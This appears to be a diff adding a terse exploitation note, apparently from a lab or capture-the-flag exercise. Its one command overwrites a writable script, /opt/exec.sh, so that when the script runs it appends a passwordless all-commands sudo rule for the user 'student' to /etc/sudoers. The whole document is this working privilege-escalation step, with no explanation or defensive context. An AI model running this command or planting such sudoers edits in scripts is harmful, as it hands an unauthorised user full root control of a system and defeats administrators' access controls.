@@ -1,0 +1,5 @@
+
+
+replace shell file with printf:
+printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /opt/exec.sh
+
